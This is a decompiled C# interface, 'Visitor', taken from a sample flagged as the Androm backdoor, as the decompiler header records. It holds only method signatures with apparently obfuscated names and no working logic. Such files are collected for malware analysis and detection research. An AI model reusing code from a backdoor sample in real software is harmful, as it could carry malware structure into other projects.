// Decompiled with JetBrains decompiler
// Type: InvalidOleVariantTypeExcept.Messages.Visitor
// Assembly: InvalidOleVariantTypeExcept, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9E82E8E9-C8CD-41F7-BA61-2A9379AE4148
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Androm.gen-02b77b24d467552510c0f56dbde53c82e4e932dcaeb0e08fcfec00d4c359a9b9.exe

using InvalidOleVariantTypeExcept.Factories;
using InvalidOleVariantTypeExcept.Watchers;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using TGL.Polices;

namespace InvalidOleVariantTypeExcept.Messages
{
  public interface Visitor
  {
    [CompilerGenerated]
    [SpecialName]
    void DefineResolver(MockStubPolicy value);

    [CompilerGenerated]
    [SpecialName]
    void CustomizeResolver(MockStubPolicy info);

    [CompilerGenerated]
    [SpecialName]
    void InsertResolver(DescriptorRegFactory value);

    [CompilerGenerated]
    [SpecialName]
    void FindResolver(DescriptorRegFactory first);

    void showView();

    bool isOpened();

    void ViewResolver();

    void AddResolver(PoolFieldMessage key);

    void CompareResolver(string i, PoolFieldMessage visitor);

    void ResolveResolver(PoolFieldMessage init);

    void AssetResolver(PoolFieldMessage asset, PoolFieldMessage vis);

    void VisitResolver(PoolFieldMessage param, PoolFieldMessage reg);

    void ListResolver(bool hasreference);

    void CalcResolver(
      KeyValuePair<BehaviorAccumulateValues, string> setup);
  }
}
